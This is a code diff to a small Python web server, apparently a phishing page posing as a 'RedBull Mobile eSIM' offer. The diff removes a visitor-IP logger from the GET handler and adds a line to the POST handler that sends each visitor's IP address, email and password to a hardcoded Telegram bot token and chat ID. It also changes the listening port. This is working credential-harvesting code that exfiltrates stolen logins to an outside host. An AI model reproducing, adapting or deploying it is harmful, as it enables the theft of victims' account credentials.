@@ -7,9 +7,6 @@ import os
 
 class RequestHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        client_ip = self.client_address[0]
-        print(client_ip)
-        bot = requests.get(f"https://api.telegram.org/bot6428331371:AAHsDPspRWFMitIEHUyd-3LvSzAQIVA3Rtk/sendMessage?chat_id=5826900952&text=•RedBull Mobile eSIM\n━━━━━━━━━━━━━━━━━━\nİP Adresi: {client_ip}\n━━━━━━━━━━━━━━━━━━\n\n                ☬𝐃𝐀𝐑𝐊 | 𝐄𝐍𝐙𝐀☬")
         if self.path == "/":
             self.send_response(200)
             self.send_header("Content-type", "text/html")
@@ -22,13 +19,14 @@ class RequestHandler(BaseHTTPRequestHandler):
             self.wfile.write(b"404 Not Found")
 
     def do_POST(self):
+        client_ip = self.client_address[0]
         if self.path == "/kod_yurut":
             content_length = int(self.headers["Content-Length"])
             post_data = self.rfile.read(content_length).decode("utf-8")
             parsed_data = json.loads(post_data)
             eposta = parsed_data["email"]
             sifre = parsed_data["password"]
-            
+            bot = requests.get(f"https://api.telegram.org/bot6428331371:AAHsDPspRWFMitIEHUyd-3LvSzAQIVA3Rtk/sendMessage?chat_id=5826900952&text=RedBull Mobile eSIM\n\n[+]IP Adresi: {client_ip}\n\n[@]Eposta: {eposta}\n[#]Sifre: {sifre}")
             key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
             
             with open("redbull.py", "r", encoding="utf-8") as file:
@@ -60,10 +58,10 @@ def get_new_filename(base_filename, extension):
         
     return new_filename
 
-def run_server(server_class=HTTPServer, handler_class=RequestHandler, port=8080):
+def run_server(server_class=HTTPServer, handler_class=RequestHandler, port=3169):
     server_address = ("", port)
     httpd = server_class(server_address, handler_class)
-    print(f"Sunucu {port} portunda çalışıyor...")
+    print(f"Sunucu {port} portunda Calisiyor...")
     httpd.serve_forever()
 
 if __name__ == "__main__":
